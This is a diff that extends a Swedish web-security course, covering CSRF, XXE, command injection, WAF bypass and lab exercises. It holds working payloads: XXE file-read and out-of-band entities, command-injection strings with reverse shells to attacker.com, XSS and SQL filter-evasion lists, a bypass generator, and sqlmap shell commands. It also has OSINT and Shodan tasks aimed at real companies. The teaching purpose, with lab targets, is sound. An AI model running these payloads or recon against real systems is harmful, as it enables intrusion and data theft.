@@ -1931,14 +1931,1687 @@ if __name__ == "__main__":
 
 ---
 
-*[Fortsättning följer med övningar 4.1-4.7 och stort projekt...]*
+### 🎯 A07: Cross-Site Request Forgery (CSRF)
 
-Vill du att jag fortsätter med resten av Nivå 4? Det kommer att inkludera:
-- CSRF testing
-- XXE (XML External Entity)
-- Command Injection
-- WAF bypass-tekniker
-- 7 detaljerade övningar
-- Stort projekt: Fullständig säkerhetsaudit av webbapplikation
+CSRF tvingar användare att utföra oönskade åtgärder när de är inloggade.
 
-Ska jag fortsätta?
+**CSRF Attack Scenario:**
+```
+Offrets Browser               Sårbar Site
+     │                            │
+     ├─1. Loggar in────────────>│
+     │<─2. Session cookie────────┤
+     │                            │
+     ├─3. Besöker attackers site │
+     │   (klickar på länk)        │
+     │                            │
+     ├─4. Dold request──────────>│
+     │   (change email)           │
+     │   Cookie: [valid session]  │
+     │                            │
+     │<─5. Email ändrad!──────────┤
+```
+
+**Test för CSRF:**
+
+```python
+#!/usr/bin/env python3
+"""
+Test for CSRF vulnerability
+"""
+
+import requests
+from bs4 import BeautifulSoup
+
+def test_csrf(target_url, session_cookie):
+    """Test if form has CSRF protection"""
+
+    print(f"[*] Testing CSRF protection on {target_url}")
+
+    # Get the form
+    response = requests.get(
+        target_url,
+        cookies={'PHPSESSID': session_cookie}
+    )
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+
+    for form in forms:
+        print(f"\n[*] Analyzing form: {form.get('action', 'N/A')}")
+
+        # Check for CSRF token
+        csrf_token = None
+
+        # Common CSRF token names
+        token_names = ['csrf', 'csrf_token', '_token', 'token', 'authenticity_token']
+
+        for token_name in token_names:
+            token_input = form.find('input', {'name': token_name})
+            if token_input:
+                csrf_token = token_input.get('value')
+                print(f"    [+] CSRF token found: {token_name}")
+                break
+
+        if not csrf_token:
+            print(f"    [!] NO CSRF TOKEN FOUND - VULNERABLE!")
+
+            # Try to exploit
+            print(f"    [*] Attempting CSRF attack...")
+
+            # Build exploit HTML
+            exploit_html = f"""
+            <html>
+            <body onload="document.forms[0].submit()">
+                <form action="{target_url}" method="POST">
+            """
+
+            # Add all form fields
+            inputs = form.find_all('input')
+            for inp in inputs:
+                if inp.get('type') != 'submit':
+                    exploit_html += f'    <input type="hidden" name="{inp.get("name")}" value="attacker_value">\n'
+
+            exploit_html += """
+                </form>
+            </body>
+            </html>
+            """
+
+            print(f"\n    [*] CSRF Exploit HTML:")
+            print(exploit_html)
+
+if __name__ == "__main__":
+    target = "http://localhost/vulnerabilities/csrf/"
+    session = "your_session_cookie"
+
+    test_csrf(target, session)
+```
+
+**CSRF Protection - Rätt implementering:**
+
+```php
+<?php
+// Generate CSRF token
+session_start();
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// In form:
+?>
+<form method="POST">
+    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+    <input type="email" name="email">
+    <button type="submit">Change Email</button>
+</form>
+
+<?php
+// Validate on submit:
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!isset($_POST['csrf_token']) ||
+        $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        die('CSRF token validation failed!');
+    }
+
+    // Process form...
+}
+?>
+```
+
+### 🎯 XXE (XML External Entity)
+
+XXE utnyttjar XML-parsers för att läsa filer eller utföra SSRF.
+
+**Sårbar kod:**
+```php
+<?php
+$xml = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // VULNERABLE!
+?>
+```
+
+**XXE Attack Payloads:**
+
+```xml
+<!-- 1. Read local files -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
+
+<!-- 2. SSRF to internal network -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://internal-server/admin">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
+
+<!-- 3. Blind XXE (out-of-band) -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+%xxe;
+]>
+```
+
+**Python Test Script:**
+
+```python
+#!/usr/bin/env python3
+"""
+Test for XXE vulnerability
+"""
+
+import requests
+
+def test_xxe(target_url):
+    """Test for XXE vulnerability"""
+
+    print(f"[*] Testing XXE on {target_url}")
+
+    # XXE payload to read /etc/passwd
+    xxe_payload = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&xxe;</data>
+</root>"""
+
+    headers = {'Content-Type': 'application/xml'}
+
+    response = requests.post(
+        target_url,
+        data=xxe_payload,
+        headers=headers
+    )
+
+    # Check if file content is reflected
+    if 'root:' in response.text and '/bin/bash' in response.text:
+        print("[!] XXE VULNERABILITY FOUND!")
+        print("[*] Successfully read /etc/passwd:")
+        print(response.text[:500])
+        return True
+    else:
+        print("[+] No XXE detected")
+        return False
+
+if __name__ == "__main__":
+    # Test target
+    target = "http://localhost/xml_endpoint"
+    test_xxe(target)
+```
+
+**XXE Protection:**
+
+```php
+<?php
+// Secure XML parsing
+$xml = file_get_contents('php://input');
+$dom = new DOMDocument();
+
+// Disable external entities!
+libxml_disable_entity_loader(true);
+$dom->loadXML($xml, LIBXML_DTDLOAD | LIBXML_DTDATTR);
+
+// Or use SimpleXML securely
+libxml_disable_entity_loader(true);
+$xml_obj = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
+?>
+```
+
+### 🎯 Command Injection
+
+Command Injection låter attackers köra OS-kommandon på servern.
+
+**Sårbar kod:**
+```php
+<?php
+$ip = $_GET['ip'];
+$output = shell_exec("ping -c 4 " . $ip); // VULNERABLE!
+echo $output;
+?>
+```
+
+**Command Injection Payloads:**
+
+```bash
+# Basic injection
+127.0.0.1; ls -la
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 | whoami
+
+# With command substitution
+127.0.0.1 `whoami`
+127.0.0.1 $(cat /etc/passwd)
+
+# Bypass filters
+127.0.0.1;cat</etc/passwd
+127.0.0.1;c''at /etc/passwd
+127.0.0.1;c\at /etc/passwd
+
+# Reverse shell
+127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+127.0.0.1; nc -e /bin/bash attacker.com 4444
+```
+
+**Python Test Script:**
+
+```python
+#!/usr/bin/env python3
+"""
+Test for Command Injection
+"""
+
+import requests
+import time
+
+def test_command_injection(target_url, param_name):
+    """Test for command injection vulnerability"""
+
+    print(f"[*] Testing Command Injection on {target_url}")
+
+    # Test payloads
+    payloads = [
+        '127.0.0.1; whoami',
+        '127.0.0.1 && id',
+        '127.0.0.1 | cat /etc/passwd',
+        '127.0.0.1 `whoami`',
+        '127.0.0.1 $(id)',
+    ]
+
+    for payload in payloads:
+        print(f"\n[*] Testing payload: {payload}")
+
+        response = requests.get(
+            target_url,
+            params={param_name: payload}
+        )
+
+        # Check for command output indicators
+        indicators = ['uid=', 'gid=', 'root:', 'www-data', '/bin/bash']
+
+        for indicator in indicators:
+            if indicator in response.text:
+                print(f"    [!] COMMAND INJECTION FOUND!")
+                print(f"    Indicator: {indicator}")
+                print(f"    Output snippet: {response.text[:200]}")
+                return True
+
+        time.sleep(0.5)
+
+    print("\n[+] No command injection detected")
+    return False
+
+# Out-of-band test (DNS/HTTP callback)
+def test_oob_command_injection(target_url, param_name, callback_domain):
+    """Test for blind command injection using OOB"""
+
+    print(f"\n[*] Testing Blind Command Injection (OOB) on {target_url}")
+
+    # Payload to trigger DNS lookup
+    payload = f'127.0.0.1; nslookup {callback_domain}'
+
+    print(f"[*] Sending payload: {payload}")
+    print(f"[*] Monitor DNS logs on {callback_domain} for lookups")
+
+    requests.get(target_url, params={param_name: payload})
+
+    print("[*] Request sent. Check your DNS logs!")
+
+if __name__ == "__main__":
+    target = "http://localhost/vulnerabilities/exec/"
+    param = "ip"
+
+    test_command_injection(target, param)
+
+    # For blind testing (requires your own domain/server)
+    # test_oob_command_injection(target, param, "attacker.com")
+```
+
+**Command Injection Protection:**
+
+```php
+<?php
+// NEVER use these functions with user input:
+// shell_exec(), exec(), system(), passthru(), popen(), proc_open()
+
+// SAFE approach: whitelist allowed values
+$ip = $_GET['ip'];
+
+// Validate IP format
+if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+    die('Invalid IP address');
+}
+
+// Use escapeshellarg() if you MUST use shell commands
+$safe_ip = escapeshellarg($ip);
+$output = shell_exec("ping -c 4 " . $safe_ip);
+
+// BETTER: Use PHP functions instead of shell commands
+$output = exec("ping -c 4 " . $safe_ip, $output_arr, $return_code);
+?>
+```
+
+---
+
+## 🛡️ Del 5: WAF Bypass Tekniker
+
+Web Application Firewalls (WAF) blockerar kända attack-mönster. Här är tekniker för att bypassa dem.
+
+### 🎯 WAF Bypass: SQL Injection
+
+```sql
+-- Case variation
+sElEcT * fRoM users
+
+-- Comments
+SELECT/**/FROM/**/users
+SELECT/*!50000FROM*/users  (MySQL version-specific)
+
+-- Encoding
+%53%45%4c%45%43%54 (URL encoding)
+\u0053\u0045\u004c\u0045\u0043\u0054 (Unicode)
+
+-- Alternative syntax
+UNION SELECT vs UNION ALL SELECT
+' OR 1=1-- vs ' OR '1'='1'--
+
+-- Whitespace alternatives
+SELECT\tFROM (tab)
+SELECT\nFROM (newline)
+SELECT/*comment*/FROM
+
+-- Inline comments
+SELECT/**_**/FROM
+SELECT/*!12345FROM*/
+
+-- String concatenation
+CONCAT('adm','in')
+'adm'+'in' (MSSQL)
+'adm'||'in' (Oracle/PostgreSQL)
+```
+
+### 🎯 WAF Bypass: XSS
+
+```javascript
+// Case variation
+<ScRiPt>alert(1)</sCrIpT>
+
+// Alternative tags
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+
+// Encoding
+&#60;script&#62;alert(1)&#60;/script&#62; (HTML entities)
+\x3cscript\x3ealert(1)\x3c/script\x3e (Hex)
+\u003cscript\u003ealert(1)\u003c/script\u003e (Unicode)
+
+// No parentheses
+<svg onload=alert`1`>
+<svg onload=alert\x281\x29>
+
+// String concatenation
+<script>eval('al'+'ert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script> (Base64)
+
+// Alternative event handlers
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+```
+
+### 🐍 Python: WAF Bypass Automation
+
+```python
+#!/usr/bin/env python3
+"""
+WAF Bypass Payload Generator
+"""
+
+import base64
+import urllib.parse
+
+class WAFBypassGenerator:
+    """Generate WAF bypass payloads"""
+
+    def __init__(self, base_payload):
+        self.base_payload = base_payload
+        self.bypassed_payloads = []
+
+    def case_variation(self):
+        """Randomize case"""
+        result = ""
+        for i, char in enumerate(self.base_payload):
+            if i % 2 == 0:
+                result += char.upper()
+            else:
+                result += char.lower()
+        return result
+
+    def comment_injection(self):
+        """Insert SQL comments"""
+        # For SQL payloads
+        if 'SELECT' in self.base_payload.upper():
+            return self.base_payload.replace(' ', '/**/').replace('SELECT', 'SEL/**/ECT')
+        return self.base_payload
+
+    def url_encoding(self, double=False):
+        """URL encode payload"""
+        encoded = urllib.parse.quote(self.base_payload)
+        if double:
+            encoded = urllib.parse.quote(encoded)
+        return encoded
+
+    def hex_encoding(self):
+        """Hex encode payload"""
+        hex_payload = ''.join([f'\\x{ord(c):02x}' for c in self.base_payload])
+        return hex_payload
+
+    def base64_encoding(self):
+        """Base64 encode"""
+        b64 = base64.b64encode(self.base_payload.encode()).decode()
+        return f"eval(atob('{b64}'))"  # For JavaScript
+
+    def unicode_encoding(self):
+        """Unicode encode"""
+        unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in self.base_payload])
+        return unicode_payload
+
+    def generate_all(self):
+        """Generate all bypass variants"""
+        variants = {
+            'Original': self.base_payload,
+            'Case Variation': self.case_variation(),
+            'Comment Injection': self.comment_injection(),
+            'URL Encoding': self.url_encoding(),
+            'Double URL Encoding': self.url_encoding(double=True),
+            'Hex Encoding': self.hex_encoding(),
+            'Base64': self.base64_encoding(),
+            'Unicode': self.unicode_encoding(),
+        }
+
+        return variants
+
+# Usage
+if __name__ == "__main__":
+    # SQL Injection payload
+    sql_payload = "' OR 1=1--"
+
+    generator = WAFBypassGenerator(sql_payload)
+    variants = generator.generate_all()
+
+    print("WAF BYPASS PAYLOADS")
+    print("=" * 70)
+
+    for name, payload in variants.items():
+        print(f"\n{name}:")
+        print(f"  {payload}")
+```
+
+---
+
+## 🎯 Övningar - Nivå 4
+
+Nu är det dags för de 7 detaljerade övningarna!
+
+### Övning 4.1: Full Corporate OSINT Investigation 🏢
+
+**Mål:** Genomför fullständig OSINT på ett företag.
+
+**Välj ett företag:** (Stort publikt företag rekommenderas)
+
+```
+FÖRETAG: _________________________________________
+```
+
+**Uppgift: Komplett OSINT-rapport**
+
+```markdown
+# CORPORATE OSINT REPORT
+
+## EXECUTIVE SUMMARY
+Företag: ___________________________________________
+Datum: _____________________________________________
+Utförd av: _________________________________________
+
+## 1. COMPANY INFORMATION
+────────────────────────────────────────────────
+Organisationsnummer: ___________________________
+Huvudkontor: ___________________________________
+VD/CEO: ________________________________________
+Antal anställda: _______________________________
+Omsättning (senaste år): _______________________
+
+Affärsområden:
+- _____________________________________________
+- _____________________________________________
+- _____________________________________________
+
+## 2. DOMAIN & INFRASTRUCTURE
+────────────────────────────────────────────────
+Huvuddomän: ____________________________________
+
+Subdomains hittade: _________ st
+
+Top 10 Subdomains:
+1. ____________________________________________
+2. ____________________________________________
+3. ____________________________________________
+[...]
+
+DNS Information:
+- Nameservers: _________________________________
+- MX Records: __________________________________
+- IP Range: ____________________________________
+- ASN: _________________________________________
+- Hosting Provider: ____________________________
+
+## 3. PEOPLE INTELLIGENCE
+────────────────────────────────────────────────
+LinkedIn Analysis:
+- Total employees on LinkedIn: ________________
+- Security team size: __________________________
+- Key personnel:
+  * CISO: ______________________________________
+  * CTO: _______________________________________
+  * Security Engineers: _________ persons
+
+Email Pattern: _________________________________
+Example emails found:
+- _____________________________________________
+- _____________________________________________
+
+## 4. TECHNOLOGY STACK
+────────────────────────────────────────────────
+Discovered Technologies:
+
+Backend:
+- _____________________________________________
+- _____________________________________________
+
+Frontend:
+- _____________________________________________
+
+Infrastructure:
+- Cloud Provider: ______________________________
+- CDN: _________________________________________
+- Other: _______________________________________
+
+## 5. SECURITY POSTURE
+────────────────────────────────────────────────
+Exposed Services (Shodan):
+- Port 80 (HTTP): ______________________________
+- Port 443 (HTTPS): ____________________________
+- Other ports: _________________________________
+
+Security Headers:
+- X-Frame-Options: Yes / No
+- CSP: Yes / No
+- HSTS: Yes / No
+
+Known Vulnerabilities:
+- _____________________________________________
+- _____________________________________________
+
+## 6. DATA LEAKS
+────────────────────────────────────────────────
+Have I Been Pwned:
+- Breached emails: _____________________________
+
+GitHub Intelligence:
+- Public repos: ________________________________
+- Potential leaks: _____________________________
+
+## 7. RECOMMENDATIONS
+────────────────────────────────────────────────
+- _____________________________________________
+- _____________________________________________
+- _____________________________________________
+```
+
+**Verktyg att använda:**
+- theHarvester, Amass, dnsenum
+- Shodan, Censys
+- LinkedIn, Google Dorking
+- WHOIS, BuiltWith
+
+**Facit:** Din rapport bör innehålla minst:
+- 20+ subdomains
+- 10+ employee names
+- Technology stack breakdown
+- Security recommendations
+
+---
+
+### Övning 4.2: Shodan API Scripting 🔍
+
+**Mål:** Använd Shodan API för att automatisera reconnaissance.
+
+**Uppgift 1: Hitta alla servrar för en organisation**
+
+```python
+#!/usr/bin/env python3
+"""
+Shodan Organizational Reconnaissance
+"""
+
+import shodan
+import json
+
+SHODAN_API_KEY = "YOUR_API_KEY"  # Get from shodan.io
+
+api = shodan.Shodan(SHODAN_API_KEY)
+
+def search_organization(org_name):
+    """Search for all hosts belonging to organization"""
+
+    print(f"[*] Searching Shodan for: {org_name}")
+
+    try:
+        # Search
+        results = api.search(f'org:"{org_name}"')
+
+        print(f"\n[+] Total results: {results['total']}")
+        print(f"[+] Showing first {len(results['matches'])} results\n")
+
+        hosts = {}
+
+        for result in results['matches']:
+            ip = result['ip_str']
+            port = result['port']
+
+            if ip not in hosts:
+                hosts[ip] = {
+                    'ports': [],
+                    'services': [],
+                    'vulns': [],
+                    'location': result.get('location', {}),
+                    'org': result.get('org', 'N/A')
+                }
+
+            hosts[ip]['ports'].append(port)
+
+            if 'product' in result:
+                hosts[ip]['services'].append(f"{result['product']} {result.get('version', '')}")
+
+            if 'vulns' in result:
+                hosts[ip]['vulns'].extend(result['vulns'])
+
+        # Print summary
+        print("DISCOVERED HOSTS")
+        print("=" * 70)
+
+        for ip, data in hosts.items():
+            print(f"\nIP: {ip}")
+            print(f"  Location: {data['location'].get('city', 'Unknown')}, {data['location'].get('country_name', 'Unknown')}")
+            print(f"  Org: {data['org']}")
+            print(f"  Open Ports: {', '.join(map(str, data['ports']))}")
+
+            if data['services']:
+                print(f"  Services:")
+                for service in set(data['services']):
+                    print(f"    - {service}")
+
+            if data['vulns']:
+                print(f"  Vulnerabilities:")
+                for vuln in set(data['vulns']):
+                    print(f"    - {vuln}")
+
+        return hosts
+
+    except shodan.APIError as e:
+        print(f"[!] Error: {e}")
+        return {}
+
+def search_vulnerabilities(cve_id):
+    """Search for hosts vulnerable to specific CVE"""
+
+    print(f"\n[*] Searching for hosts vulnerable to {cve_id}")
+
+    try:
+        results = api.search(f'vuln:{cve_id}')
+
+        print(f"[+] Found {results['total']} vulnerable hosts")
+
+        for result in results['matches'][:10]:  # Show first 10
+            print(f"\n  IP: {result['ip_str']}")
+            print(f"  Port: {result['port']}")
+            print(f"  Org: {result.get('org', 'N/A')}")
+            print(f"  Location: {result.get('location', {}).get('country_name', 'Unknown')}")
+
+    except shodan.APIError as e:
+        print(f"[!] Error: {e}")
+
+# Main
+if __name__ == "__main__":
+    # Search for organization
+    org = input("Enter organization name: ")
+    hosts = search_organization(org)
+
+    # Save results
+    with open(f'{org}_shodan.json', 'w') as f:
+        json.dump(hosts, f, indent=2)
+
+    print(f"\n[+] Results saved to {org}_shodan.json")
+
+    # Optional: Search for specific vulnerability
+    cve = input("\nSearch for CVE? (enter CVE-ID or press enter to skip): ")
+    if cve:
+        search_vulnerabilities(cve)
+```
+
+**Kör scriptet:**
+```bash
+python3 shodan_recon.py
+# Enter: Spotify (eller annat företag)
+```
+
+**Dokumentera:**
+```
+Företag testat: _____________________________________
+Antal hosts hittade: ________________________________
+Öppna portar (top 5):
+1. __________________________________________________
+2. __________________________________________________
+3. __________________________________________________
+4. __________________________________________________
+5. __________________________________________________
+
+Sårbarheter upptäckta: ______________________________
+```
+
+---
+
+### Övning 4.3: ZAP Automated Scan med Python 🤖
+
+**Mål:** Skapa komplett automatiserad scan-pipeline med rapporter.
+
+**Uppgift: Bygga din egen scanner**
+
+Använd Python Exempel 7 från Del 3 som bas. Modifiera den för att:
+1. Skanna 3 olika targets (DVWA, WebGoat, Juice Shop)
+2. Generera separata rapporter för varje
+3. Skicka email-notifikation när färdigt (bonus)
+
+**Din kod:**
+```python
+#!/usr/bin/env python3
+"""
+Multi-Target Automated Scanner
+"""
+
+from zapv2 import ZAPv2
+import time
+from datetime import datetime
+import smtplib
+from email.mime.text import MIMEText
+
+class MultiTargetScanner:
+    """Scan multiple targets with ZAP"""
+
+    def __init__(self, api_key='CHANGEME'):
+        self.zap = ZAPv2(
+            apikey=api_key,
+            proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
+        )
+        self.results = {}
+
+    def scan_target(self, target_url, target_name):
+        """Scan single target"""
+
+        print(f"\n{'='*70}")
+        print(f"SCANNING: {target_name}")
+        print(f"{'='*70}")
+
+        start_time = datetime.now()
+
+        # Spider
+        print("[*] Spidering...")
+        spider_id = self.zap.spider.scan(target_url)
+        while int(self.zap.spider.status(spider_id)) < 100:
+            time.sleep(2)
+        print("[+] Spider complete")
+
+        # Passive scan
+        print("[*] Passive scanning...")
+        while int(self.zap.pscan.records_to_scan) > 0:
+            time.sleep(2)
+        print("[+] Passive scan complete")
+
+        # Active scan
+        print("[*] Active scanning...")
+        scan_id = self.zap.ascan.scan(target_url)
+        while int(self.zap.ascan.status(scan_id)) < 100:
+            progress = int(self.zap.ascan.status(scan_id))
+            print(f"    Progress: {progress}%", end='\r')
+            time.sleep(5)
+        print("\n[+] Active scan complete")
+
+        # Get alerts
+        alerts = self.zap.core.alerts(baseurl=target_url)
+
+        # Categorize
+        by_risk = {'High': [], 'Medium': [], 'Low': [], 'Informational': []}
+        for alert in alerts:
+            by_risk[alert['risk']].append(alert)
+
+        # Store results
+        self.results[target_name] = {
+            'url': target_url,
+            'start_time': start_time,
+            'end_time': datetime.now(),
+            'duration': datetime.now() - start_time,
+            'alerts': alerts,
+            'by_risk': by_risk
+        }
+
+        # Generate report
+        report_file = f"{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+        with open(report_file, 'w') as f:
+            f.write(self.zap.core.htmlreport())
+
+        print(f"[+] Report saved: {report_file}")
+
+        return by_risk
+
+    def scan_all(self, targets):
+        """Scan all targets"""
+
+        for name, url in targets.items():
+            self.scan_target(url, name)
+
+            # Print summary
+            result = self.results[name]
+            print(f"\n{name} Summary:")
+            print(f"  High: {len(result['by_risk']['High'])}")
+            print(f"  Medium: {len(result['by_risk']['Medium'])}")
+            print(f"  Low: {len(result['by_risk']['Low'])}")
+            print(f"  Duration: {result['duration']}")
+
+    def generate_summary_report(self):
+        """Generate summary of all scans"""
+
+        summary = f"""
+MULTI-TARGET SCAN SUMMARY
+Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+{'='*70}
+
+"""
+        for name, result in self.results.items():
+            summary += f"""
+{name}:
+  URL: {result['url']}
+  Duration: {result['duration']}
+  High Risk: {len(result['by_risk']['High'])}
+  Medium Risk: {len(result['by_risk']['Medium'])}
+  Low Risk: {len(result['by_risk']['Low'])}
+  Total Alerts: {len(result['alerts'])}
+{'='*70}
+"""
+
+        # Save summary
+        with open('scan_summary.txt', 'w') as f:
+            f.write(summary)
+
+        print(summary)
+        return summary
+
+# Main
+if __name__ == "__main__":
+    targets = {
+        'DVWA': 'http://localhost',
+        # 'WebGoat': 'http://localhost:8080/WebGoat',
+        # 'JuiceShop': 'http://localhost:3000'
+    }
+
+    scanner = MultiTargetScanner()
+    scanner.scan_all(targets)
+    scanner.generate_summary_report()
+
+    print("\n[+] All scans complete!")
+```
+
+**Kör:**
+```bash
+# Starta ZAP daemon först
+zap.sh -daemon -port 8080 -config api.key=CHANGEME
+
+# Kör scanner
+python3 multi_target_scanner.py
+```
+
+**Dokumentera:**
+```
+Targets scannade: ___________________________________
+Total tid: __________________________________________
+Total alerts High: __________________________________
+Total alerts Medium: ________________________________
+
+Vanligaste sårbarheter:
+1. _________________________________________________
+2. _________________________________________________
+3. _________________________________________________
+```
+
+---
+
+### Övning 4.4: SQL Injection - Manual till SQLmap 💉
+
+**Mål:** Hitta SQLi manuellt, sedan använd SQLmap för att exploatera.
+
+**Uppgift: DVWA SQL Injection**
+
+**Steg 1: Manual Detection**
+
+```
+Target URL: http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
+
+Test 1: ' OR '1'='1
+Result: ________________________________________
+
+Test 2: ' AND '1'='2
+Result: ________________________________________
+
+Test 3: ' UNION SELECT NULL--
+Result: ________________________________________
+
+Number of columns: _____
+```
+
+**Steg 2: Manual Extraction**
+
+```sql
+-- Hitta kolumner
+' UNION SELECT NULL, NULL--
+
+-- Extrahera database namn
+' UNION SELECT database(), NULL--
+Result: ________________________________________
+
+-- Lista tabeller
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'--
+Tables found:
+- _____________________________________________
+- _____________________________________________
+
+-- Lista kolumner i users-tabell
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+Columns found:
+- _____________________________________________
+- _____________________________________________
+
+-- Dumpa users
+' UNION SELECT user, password FROM users--
+Users found:
+- _____________________________________________
+- _____________________________________________
+```
+
+**Steg 3: SQLmap Automation**
+
+```bash
+# Basic detection
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
+  --batch
+
+# Dump databases
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
+  --dbs \
+  --batch
+
+# Dump users table
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
+  -D dvwa -T users --dump \
+  --batch
+
+# Try to get shell
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
+  --os-shell \
+  --batch
+```
+
+**Dokumentera:**
+```
+SQLMAP RESULTAT
+═══════════════════════════════════════════════════════════
+Database: ___________________________________________
+Tables: _____________________________________________
+Users dumped: _______________________________________
+
+Hashed passwords:
+- admin: ___________________________________________
+- user: ____________________________________________
+
+Cracked passwords (om möjligt):
+- admin: ___________________________________________
+- user: ____________________________________________
+
+OS Shell: Yes / No
+```
+
+---
+
+### Övning 4.5: AJAX Spider för SPA (Single Page Apps) 🕸️
+
+**Mål:** Använd AJAX Spider för att testa moderna JavaScript-applikationer.
+
+**Target:** OWASP Juice Shop (SPA byggt med Angular)
+
+**Setup:**
+```bash
+# Run Juice Shop
+docker run -p 3000:3000 bkimminich/juice-shop
+```
+
+**Uppgift: Traditional vs AJAX Spider**
+
+```python
+#!/usr/bin/env python3
+"""
+Compare Traditional Spider vs AJAX Spider
+"""
+
+from zapv2 import ZAPv2
+import time
+
+ZAP_API_KEY = 'CHANGEME'
+zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})
+
+target = "http://localhost:3000"
+
+print("[*] Starting Traditional Spider...")
+trad_id = zap.spider.scan(target)
+while int(zap.spider.status(trad_id)) < 100:
+    time.sleep(2)
+
+trad_urls = zap.spider.results(trad_id)
+print(f"[+] Traditional Spider found: {len(trad_urls)} URLs")
+
+print("\n[*] Starting AJAX Spider...")
+zap.ajaxSpider.scan(target)
+
+while zap.ajaxSpider.status == 'running':
+    print(f"    AJAX Spider running... (found {zap.ajaxSpider.number_of_results} so far)")
+    time.sleep(5)
+
+ajax_urls = zap.ajaxSpider.results
+print(f"[+] AJAX Spider found: {len(ajax_urls)} URLs")
+
+# Compare
+only_in_ajax = set(ajax_urls) - set(trad_urls)
+print(f"\n[*] URLs found ONLY by AJAX Spider: {len(only_in_ajax)}")
+
+for url in list(only_in_ajax)[:10]:
+    print(f"  - {url}")
+```
+
+**Dokumentera:**
+```
+SPIDER COMPARISON
+═══════════════════════════════════════════════════════════
+Traditional Spider URLs: ____________________________
+AJAX Spider URLs: ___________________________________
+
+URLs only found by AJAX Spider: _____________________
+
+Conclusion: _________________________________________
+_____________________________________________________
+```
+
+---
+
+### Övning 4.6: Custom ZAP Script för Specific Vulnerability 📝
+
+**Mål:** Skriv ett custom ZAP-script för att hitta en specifik sårbarhet.
+
+**Uppgift: Hitta Exposed `.git` directories**
+
+```python
+#!/usr/bin/env python3
+"""
+Custom ZAP Script: Find Exposed .git Directories
+"""
+
+from zapv2 import ZAPv2
+import requests
+
+ZAP_API_KEY = 'CHANGEME'
+zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})
+
+def find_git_exposure(base_url):
+    """Check for exposed .git directory"""
+
+    print(f"[*] Checking {base_url} for .git exposure")
+
+    git_paths = [
+        '/.git',
+        '/.git/config',
+        '/.git/HEAD',
+        '/.git/logs/HEAD',
+        '/.gitignore'
+    ]
+
+    findings = []
+
+    for path in git_paths:
+        test_url = f"{base_url}{path}"
+
+        try:
+            # Access through ZAP
+            zap.core.access_url(test_url, followredirects=False)
+
+            # Get response
+            messages = zap.core.messages(baseurl=test_url)
+
+            if messages:
+                msg = zap.core.message(messages[-1]['id'])
+                response_code = msg['responseHeader'].split()[1]
+
+                if response_code == '200':
+                    print(f"    [!] FOUND: {test_url}")
+                    findings.append(test_url)
+
+                    # Check content
+                    if 'repositoryformatversion' in msg['responseBody'].lower():
+                        print(f"        Confirmed: Valid .git/config")
+                    elif '[core]' in msg['responseBody']:
+                        print(f"        Confirmed: Git configuration file")
+                    elif 'ref:' in msg['responseBody']:
+                        print(f"        Confirmed: Git HEAD file")
+
+        except Exception as e:
+            pass
+
+    return findings
+
+# Test multiple sites
+sites = zap.core.sites
+
+for site in sites:
+    findings = find_git_exposure(site)
+
+    if findings:
+        print(f"\n[!] CRITICAL: .git exposure found on {site}")
+        print(f"    Exposed paths: {len(findings)}")
+
+        # Create alert
+        for finding in findings:
+            # You could create a custom alert here
+            print(f"    - {finding}")
+```
+
+**Kör:**
+```bash
+python3 check_git_exposure.py
+```
+
+**Expandera scriptet:**
+Lägg till checks för:
+- `.env` files
+- `wp-config.php`
+- `config.php`
+- `database.yml`
+
+---
+
+### Övning 4.7: WAF Bypass Challenge 🛡️
+
+**Mål:** Bypassa en WAF för att exploatera SQLi.
+
+**Setup: Install ModSecurity (Open Source WAF)**
+
+```bash
+# Setup kommer variera - använd en pre-configured Docker image
+docker run -d -p 80:80 owasp/modsecurity-crs:apache
+```
+
+**Uppgift: Bypass ModSecurity**
+
+**Steg 1: Normal SQLi (ska blockas)**
